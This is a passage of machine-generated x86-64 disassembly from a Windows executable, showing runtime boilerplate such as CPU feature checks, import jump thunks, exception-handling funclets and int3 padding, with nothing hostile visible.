   140007594:	48 8b 05 f5 5a 00 00 	mov    0x5af5(%rip),%rax        # 0x14000d090
   14000759b:	0f ba e6 17          	bt     $0x17,%esi
   14000759f:	73 0c                	jae    0x1400075ad
   1400075a1:	48 0f ba f0 18       	btr    $0x18,%rax
   1400075a6:	48 89 05 e3 5a 00 00 	mov    %rax,0x5ae3(%rip)        # 0x14000d090
   1400075ad:	41 0f ba e2 13       	bt     $0x13,%r10d
   1400075b2:	73 4a                	jae    0x1400075fe
   1400075b4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400075b9:	22 c2                	and    %dl,%al
   1400075bb:	3a c2                	cmp    %dl,%al
   1400075bd:	75 3f                	jne    0x1400075fe
   1400075bf:	41 8b cb             	mov    %r11d,%ecx
   1400075c2:	41 8b c3             	mov    %r11d,%eax
   1400075c5:	48 c1 e9 10          	shr    $0x10,%rcx
   1400075c9:	25 ff 00 04 00       	and    $0x400ff,%eax
   1400075ce:	83 e1 06             	and    $0x6,%ecx
   1400075d1:	89 05 95 63 00 00    	mov    %eax,0x6395(%rip)        # 0x14000d96c
   1400075d7:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   1400075de:	48 f7 d1             	not    %rcx
   1400075e1:	48 23 0d a8 5a 00 00 	and    0x5aa8(%rip),%rcx        # 0x14000d090
   1400075e8:	48 89 0d a1 5a 00 00 	mov    %rcx,0x5aa1(%rip)        # 0x14000d090
   1400075ef:	3c 01                	cmp    $0x1,%al
   1400075f1:	76 0b                	jbe    0x1400075fe
   1400075f3:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   1400075f7:	48 89 0d 92 5a 00 00 	mov    %rcx,0x5a92(%rip)        # 0x14000d090
   1400075fe:	41 0f ba e2 15       	bt     $0x15,%r10d
   140007603:	73 15                	jae    0x14000761a
   140007605:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000760a:	48 0f ba e0 13       	bt     $0x13,%rax
   14000760f:	73 09                	jae    0x14000761a
   140007611:	48 0f ba 35 76 5a 00 	btrq   $0x7,0x5a76(%rip)        # 0x14000d090
   140007618:	00 07 
   14000761a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000761f:	33 c0                	xor    %eax,%eax
   140007621:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140007626:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000762b:	48 83 c4 10          	add    $0x10,%rsp
   14000762f:	5f                   	pop    %rdi
   140007630:	c3                   	ret
   140007631:	cc                   	int3
   140007632:	cc                   	int3
   140007633:	cc                   	int3
   140007634:	33 c0                	xor    %eax,%eax
   140007636:	39 05 74 5a 00 00    	cmp    %eax,0x5a74(%rip)        # 0x14000d0b0
   14000763c:	0f 95 c0             	setne  %al
   14000763f:	c3                   	ret
   140007640:	48 83 ec 28          	sub    $0x28,%rsp
   140007644:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140007648:	48 8b ca             	mov    %rdx,%rcx
   14000764b:	49 8b d1             	mov    %r9,%rdx
   14000764e:	e8 0d 00 00 00       	call   0x140007660
   140007653:	b8 01 00 00 00       	mov    $0x1,%eax
   140007658:	48 83 c4 28          	add    $0x28,%rsp
   14000765c:	c3                   	ret
   14000765d:	cc                   	int3
   14000765e:	cc                   	int3
   14000765f:	cc                   	int3
   140007660:	40 53                	rex push %rbx
   140007662:	45 8b 18             	mov    (%r8),%r11d
   140007665:	48 8b da             	mov    %rdx,%rbx
   140007668:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000766c:	4c 8b c9             	mov    %rcx,%r9
   14000766f:	41 f6 00 04          	testb  $0x4,(%r8)
   140007673:	4c 8b d1             	mov    %rcx,%r10
   140007676:	74 13                	je     0x14000768b
   140007678:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000767c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140007680:	f7 d8                	neg    %eax
   140007682:	4c 03 d1             	add    %rcx,%r10
   140007685:	48 63 c8             	movslq %eax,%rcx
   140007688:	4c 23 d1             	and    %rcx,%r10
   14000768b:	49 63 c3             	movslq %r11d,%rax
   14000768e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140007692:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140007696:	8b 48 08             	mov    0x8(%rax),%ecx
   140007699:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000769d:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400076a2:	74 10                	je     0x1400076b4
   1400076a4:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   1400076a9:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   1400076ae:	48 23 c1             	and    %rcx,%rax
   1400076b1:	4c 03 c8             	add    %rax,%r9
   1400076b4:	4c 33 ca             	xor    %rdx,%r9
   1400076b7:	49 8b c9             	mov    %r9,%rcx
   1400076ba:	5b                   	pop    %rbx
   1400076bb:	e9 80 f1 ff ff       	jmp    0x140006840
   1400076c0:	ff 25 3a 0d 00 00    	jmp    *0xd3a(%rip)        # 0x140008400
   1400076c6:	ff 25 f4 0c 00 00    	jmp    *0xcf4(%rip)        # 0x1400083c0
   1400076cc:	ff 25 06 0d 00 00    	jmp    *0xd06(%rip)        # 0x1400083d8
   1400076d2:	ff 25 d8 0c 00 00    	jmp    *0xcd8(%rip)        # 0x1400083b0
   1400076d8:	ff 25 ca 0c 00 00    	jmp    *0xcca(%rip)        # 0x1400083a8
   1400076de:	ff 25 d4 0c 00 00    	jmp    *0xcd4(%rip)        # 0x1400083b8
   1400076e4:	ff 25 fe 0c 00 00    	jmp    *0xcfe(%rip)        # 0x1400083e8
   1400076ea:	ff 25 00 0e 00 00    	jmp    *0xe00(%rip)        # 0x1400084f0
   1400076f0:	ff 25 4a 0d 00 00    	jmp    *0xd4a(%rip)        # 0x140008440
   1400076f6:	ff 25 3c 0d 00 00    	jmp    *0xd3c(%rip)        # 0x140008438
   1400076fc:	ff 25 4e 0d 00 00    	jmp    *0xd4e(%rip)        # 0x140008450
   140007702:	ff 25 e0 0d 00 00    	jmp    *0xde0(%rip)        # 0x1400084e8
   140007708:	ff 25 d2 0d 00 00    	jmp    *0xdd2(%rip)        # 0x1400084e0
   14000770e:	ff 25 5c 0d 00 00    	jmp    *0xd5c(%rip)        # 0x140008470
   140007714:	ff 25 be 0d 00 00    	jmp    *0xdbe(%rip)        # 0x1400084d8
   14000771a:	ff 25 b0 0d 00 00    	jmp    *0xdb0(%rip)        # 0x1400084d0
   140007720:	ff 25 a2 0d 00 00    	jmp    *0xda2(%rip)        # 0x1400084c8
   140007726:	ff 25 7c 0d 00 00    	jmp    *0xd7c(%rip)        # 0x1400084a8
   14000772c:	ff 25 6e 0d 00 00    	jmp    *0xd6e(%rip)        # 0x1400084a0
   140007732:	ff 25 60 0d 00 00    	jmp    *0xd60(%rip)        # 0x140008498
   140007738:	ff 25 4a 0d 00 00    	jmp    *0xd4a(%rip)        # 0x140008488
   14000773e:	ff 25 04 0e 00 00    	jmp    *0xe04(%rip)        # 0x140008548
   140007744:	ff 25 36 0d 00 00    	jmp    *0xd36(%rip)        # 0x140008480
   14000774a:	ff 25 b0 0d 00 00    	jmp    *0xdb0(%rip)        # 0x140008500
   140007750:	ff 25 3a 0d 00 00    	jmp    *0xd3a(%rip)        # 0x140008490
   140007756:	ff 25 04 0d 00 00    	jmp    *0xd04(%rip)        # 0x140008460
   14000775c:	ff 25 e6 0c 00 00    	jmp    *0xce6(%rip)        # 0x140008448
   140007762:	ff 25 d8 0d 00 00    	jmp    *0xdd8(%rip)        # 0x140008540
   140007768:	ff 25 42 0d 00 00    	jmp    *0xd42(%rip)        # 0x1400084b0
   14000776e:	ff 25 44 0d 00 00    	jmp    *0xd44(%rip)        # 0x1400084b8
   140007774:	ff 25 46 0d 00 00    	jmp    *0xd46(%rip)        # 0x1400084c0
   14000777a:	cc                   	int3
   14000777b:	cc                   	int3
   14000777c:	48 8b c4             	mov    %rsp,%rax
   14000777f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007783:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007787:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000778b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000778f:	41 56                	push   %r14
   140007791:	48 83 ec 20          	sub    $0x20,%rsp
   140007795:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140007799:	48 8b f2             	mov    %rdx,%rsi
   14000779c:	4d 8b f0             	mov    %r8,%r14
   14000779f:	48 8b e9             	mov    %rcx,%rbp
   1400077a2:	49 8b d1             	mov    %r9,%rdx
   1400077a5:	48 8b ce             	mov    %rsi,%rcx
   1400077a8:	49 8b f9             	mov    %r9,%rdi
   1400077ab:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1400077af:	e8 ac fe ff ff       	call   0x140007660
   1400077b4:	8b 45 04             	mov    0x4(%rbp),%eax
   1400077b7:	24 66                	and    $0x66,%al
   1400077b9:	f6 d8                	neg    %al
   1400077bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400077c0:	45 1b c9             	sbb    %r9d,%r9d
   1400077c3:	41 f7 d9             	neg    %r9d
   1400077c6:	44 03 c8             	add    %eax,%r9d
   1400077c9:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   1400077cd:	74 11                	je     0x1400077e0
   1400077cf:	4c 8b cf             	mov    %rdi,%r9
   1400077d2:	4d 8b c6             	mov    %r14,%r8
   1400077d5:	48 8b d6             	mov    %rsi,%rdx
   1400077d8:	48 8b cd             	mov    %rbp,%rcx
   1400077db:	e8 e0 fe ff ff       	call   0x1400076c0
   1400077e0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400077e5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400077ea:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400077ef:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400077f4:	48 83 c4 20          	add    $0x20,%rsp
   1400077f8:	41 5e                	pop    %r14
   1400077fa:	c3                   	ret
   1400077fb:	ff 25 df 0b 00 00    	jmp    *0xbdf(%rip)        # 0x1400083e0
   140007801:	ff 25 e9 0b 00 00    	jmp    *0xbe9(%rip)        # 0x1400083f0
   140007807:	cc                   	int3
   140007808:	cc                   	int3
   140007809:	cc                   	int3
   14000780a:	cc                   	int3
   14000780b:	cc                   	int3
   14000780c:	cc                   	int3
   14000780d:	cc                   	int3
   14000780e:	cc                   	int3
   14000780f:	cc                   	int3
   140007810:	cc                   	int3
   140007811:	cc                   	int3
   140007812:	cc                   	int3
   140007813:	cc                   	int3
   140007814:	cc                   	int3
   140007815:	cc                   	int3
   140007816:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000781d:	00 00 00 
   140007820:	ff e0                	jmp    *%rax
   140007822:	cc                   	int3
   140007823:	cc                   	int3
   140007824:	cc                   	int3
   140007825:	cc                   	int3
   140007826:	cc                   	int3
   140007827:	cc                   	int3
   140007828:	cc                   	int3
   140007829:	cc                   	int3
   14000782a:	cc                   	int3
   14000782b:	cc                   	int3
   14000782c:	cc                   	int3
   14000782d:	cc                   	int3
   14000782e:	cc                   	int3
   14000782f:	cc                   	int3
   140007830:	cc                   	int3
   140007831:	cc                   	int3
   140007832:	cc                   	int3
   140007833:	cc                   	int3
   140007834:	cc                   	int3
   140007835:	cc                   	int3
   140007836:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000783d:	00 00 00 
   140007840:	ff 25 d2 0d 00 00    	jmp    *0xdd2(%rip)        # 0x140008618
   140007846:	cc                   	int3
   140007847:	cc                   	int3
   140007848:	cc                   	int3
   140007849:	cc                   	int3
   14000784a:	cc                   	int3
   14000784b:	cc                   	int3
   14000784c:	cc                   	int3
   14000784d:	cc                   	int3
   14000784e:	cc                   	int3
   14000784f:	cc                   	int3
   140007850:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007857:	e9 44 9b ff ff       	jmp    0x1400013a0
   14000785c:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007863:	e9 38 9b ff ff       	jmp    0x1400013a0
   140007868:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   14000786f:	e9 2c 9b ff ff       	jmp    0x1400013a0
   140007874:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   14000787b:	e9 20 9b ff ff       	jmp    0x1400013a0
   140007880:	40 55                	rex push %rbp
   140007882:	48 83 ec 20          	sub    $0x20,%rsp
   140007886:	48 8b ea             	mov    %rdx,%rbp
   140007889:	ba 18 00 00 00       	mov    $0x18,%edx
   14000788e:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007892:	e8 c9 ef ff ff       	call   0x140006860
   140007897:	48 83 c4 20          	add    $0x20,%rsp
   14000789b:	5d                   	pop    %rbp
   14000789c:	c3                   	ret
   14000789d:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   1400078a4:	e9 87 9a ff ff       	jmp    0x140001330
   1400078a9:	40 55                	rex push %rbp
   1400078ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400078af:	48 8b ea             	mov    %rdx,%rbp
   1400078b2:	ba 18 00 00 00       	mov    $0x18,%edx
   1400078b7:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400078bb:	e8 a0 ef ff ff       	call   0x140006860
   1400078c0:	48 83 c4 20          	add    $0x20,%rsp
   1400078c4:	5d                   	pop    %rbp
   1400078c5:	c3                   	ret
   1400078c6:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   1400078cd:	e9 5e 9a ff ff       	jmp    0x140001330
   1400078d2:	40 55                	rex push %rbp
   1400078d4:	48 83 ec 20          	sub    $0x20,%rsp
   1400078d8:	48 8b ea             	mov    %rdx,%rbp
   1400078db:	ba 18 00 00 00       	mov    $0x18,%edx
   1400078e0:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400078e4:	e8 77 ef ff ff       	call   0x140006860
   1400078e9:	48 83 c4 20          	add    $0x20,%rsp
   1400078ed:	5d                   	pop    %rbp
   1400078ee:	c3                   	ret
   1400078ef:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   1400078f6:	e9 35 9a ff ff       	jmp    0x140001330
   1400078fb:	40 55                	rex push %rbp
   1400078fd:	48 83 ec 20          	sub    $0x20,%rsp
   140007901:	48 8b ea             	mov    %rdx,%rbp
   140007904:	ba 18 00 00 00       	mov    $0x18,%edx
   140007909:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000790d:	e8 4e ef ff ff       	call   0x140006860
   140007912:	48 83 c4 20          	add    $0x20,%rsp
   140007916:	5d                   	pop    %rbp
   140007917:	c3                   	ret
   140007918:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   14000791f:	e9 0c 9a ff ff       	jmp    0x140001330
   140007924:	40 55                	rex push %rbp
   140007926:	48 83 ec 20          	sub    $0x20,%rsp
   14000792a:	48 8b ea             	mov    %rdx,%rbp
   14000792d:	ba 18 00 00 00       	mov    $0x18,%edx
   140007932:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007936:	e8 25 ef ff ff       	call   0x140006860
   14000793b:	48 83 c4 20          	add    $0x20,%rsp
   14000793f:	5d                   	pop    %rbp
   140007940:	c3                   	ret
   140007941:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007948:	e9 e3 99 ff ff       	jmp    0x140001330
   14000794d:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140007954:	e9 47 9a ff ff       	jmp    0x1400013a0
   140007959:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007960:	e9 3b 9a ff ff       	jmp    0x1400013a0
   140007965:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   14000796c:	e9 2f 9a ff ff       	jmp    0x1400013a0
   140007971:	40 55                	rex push %rbp
   140007973:	48 83 ec 20          	sub    $0x20,%rsp
   140007977:	48 8b ea             	mov    %rdx,%rbp
   14000797a:	ba 18 00 00 00       	mov    $0x18,%edx
   14000797f:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007983:	e8 d8 ee ff ff       	call   0x140006860
   140007988:	48 83 c4 20          	add    $0x20,%rsp
   14000798c:	5d                   	pop    %rbp
   14000798d:	c3                   	ret
   14000798e:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007995:	e9 96 99 ff ff       	jmp    0x140001330
   14000799a:	cc                   	int3
   14000799b:	cc                   	int3
   14000799c:	cc                   	int3
   14000799d:	cc                   	int3
   14000799e:	cc                   	int3
   14000799f:	cc                   	int3
   1400079a0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400079a7:	e9 b4 d1 ff ff       	jmp    0x140004b60
   1400079ac:	cc                   	int3
   1400079ad:	cc                   	int3
   1400079ae:	cc                   	int3
   1400079af:	cc                   	int3
   1400079b0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400079b7:	e9 34 d1 ff ff       	jmp    0x140004af0
   1400079bc:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   1400079c3:	e9 48 bc ff ff       	jmp    0x140003610
   1400079c8:	cc                   	int3
   1400079c9:	cc                   	int3
   1400079ca:	cc                   	int3
   1400079cb:	cc                   	int3
   1400079cc:	cc                   	int3
   1400079cd:	cc                   	int3
   1400079ce:	cc                   	int3
   1400079cf:	cc                   	int3
   1400079d0:	40 55                	rex push %rbp
   1400079d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400079d6:	48 8b ea             	mov    %rdx,%rbp
   1400079d9:	8b 45 20             	mov    0x20(%rbp),%eax
   1400079dc:	83 e0 01             	and    $0x1,%eax
   1400079df:	85 c0                	test   %eax,%eax
   1400079e1:	74 15                	je     0x1400079f8
   1400079e3:	83 65 20 fe          	andl   $0xfffffffe,0x20(%rbp)
   1400079e7:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1400079eb:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   1400079f2:	ff 15 78 07 00 00    	call   *0x778(%rip)        # 0x140008170
   1400079f8:	48 83 c4 20          	add    $0x20,%rsp
   1400079fc:	5d                   	pop    %rbp
   1400079fd:	c3                   	ret
   1400079fe:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007a05:	48 83 c1 10          	add    $0x10,%rcx
   140007a09:	48 ff 25 38 07 00 00 	rex.W jmp *0x738(%rip)        # 0x140008148
   140007a10:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007a17:	48 83 c1 08          	add    $0x8,%rcx
   140007a1b:	e9 40 e0 ff ff       	jmp    0x140005a60
   140007a20:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007a27:	e9 a4 99 ff ff       	jmp    0x1400013d0
   140007a2c:	cc                   	int3
   140007a2d:	cc                   	int3
   140007a2e:	cc                   	int3
   140007a2f:	cc                   	int3
   140007a30:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140007a37:	e9 a4 d1 ff ff       	jmp    0x140004be0
   140007a3c:	cc                   	int3
   140007a3d:	cc                   	int3
   140007a3e:	cc                   	int3
   140007a3f:	cc                   	int3
   140007a40:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140007a47:	48 ff 25 4a 07 00 00 	rex.W jmp *0x74a(%rip)        # 0x140008198
   140007a4e:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007a55:	e9 26 e5 ff ff       	jmp    0x140005f80
   140007a5a:	40 55                	rex push %rbp
   140007a5c:	48 83 ec 20          	sub    $0x20,%rsp
   140007a60:	48 8b ea             	mov    %rdx,%rbp
   140007a63:	48 8b d1             	mov    %rcx,%rdx
   140007a66:	48 8b 09             	mov    (%rcx),%rcx
   140007a69:	8b 09                	mov    (%rcx),%ecx
   140007a6b:	e8 92 fc ff ff       	call   0x140007702
   140007a70:	90                   	nop
   140007a71:	48 83 c4 20          	add    $0x20,%rsp
   140007a75:	5d                   	pop    %rbp
   140007a76:	c3                   	ret
   140007a77:	cc                   	int3
   140007a78:	40 55                	rex push %rbp
   140007a7a:	48 8b ea             	mov    %rdx,%rbp
   140007a7d:	48 8b 01             	mov    (%rcx),%rax
   140007a80:	33 c9                	xor    %ecx,%ecx
   140007a82:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140007a88:	0f 94 c1             	sete   %cl
   140007a8b:	8b c1                	mov    %ecx,%eax
   140007a8d:	5d                   	pop    %rbp
   140007a8e:	c3                   	ret
   140007a8f:	cc                   	int3
   140007a90:	40 53                	rex push %rbx
   140007a92:	48 83 ec 20          	sub    $0x20,%rsp
   140007a96:	eb 3d                	jmp    0x140007ad5
   140007a98:	48 8b 03             	mov    (%rbx),%rax
   140007a9b:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007a9f:	48 89 05 da 58 00 00 	mov    %rax,0x58da(%rip)        # 0x14000d380
   140007aa6:	48 8b 01             	mov    (%rcx),%rax
   140007aa9:	48 8b 40 10          	mov    0x10(%rax),%rax
   140007aad:	ff 15 65 0b 00 00    	call   *0xb65(%rip)        # 0x140008618
   140007ab3:	48 8b c8             	mov    %rax,%rcx
   140007ab6:	48 85 c0             	test   %rax,%rax
   140007ab9:	74 11                	je     0x140007acc
   140007abb:	48 8b 10             	mov    (%rax),%rdx
   140007abe:	48 8b 02             	mov    (%rdx),%rax
   140007ac1:	ba 01 00 00 00       	mov    $0x1,%edx
   140007ac6:	ff 15 4c 0b 00 00    	call   *0xb4c(%rip)        # 0x140008618
   140007acc:	48 8b cb             	mov    %rbx,%rcx
   140007acf:	ff 15 6b 09 00 00    	call   *0x96b(%rip)        # 0x140008440
   140007ad5:	48 8b 1d a4 58 00 00 	mov    0x58a4(%rip),%rbx        # 0x14000d380
   140007adc:	48 85 db             	test   %rbx,%rbx
   140007adf:	75 b7                	jne    0x140007a98
   140007ae1:	48 83 c4 20          	add    $0x20,%rsp
   140007ae5:	5b                   	pop    %rbx
   140007ae6:	c3                   	ret
